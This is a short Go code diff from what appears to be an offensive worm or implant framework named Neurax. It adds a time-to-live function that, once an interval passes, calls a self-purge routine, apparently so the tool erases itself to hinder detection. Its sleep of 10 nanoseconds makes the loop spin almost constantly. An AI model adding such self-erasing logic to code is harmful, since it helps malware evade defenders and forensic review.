@@ -491,3 +491,14 @@ func NeuraxWordlist(words []string) []string {
 	}
 	return wordlist
 }
+
+func NeuraxSetTTL(interval string) {
+	first_exec := time.Now()
+	for {
+		time.Sleep(time.Duration(10))
+		passed := time.Since(first_exec).Seconds()
+		if int(passed) > coldfire.IntervalToSeconds(interval) {
+			NeuraxPurgeSelf()
+		}
+	}
+}
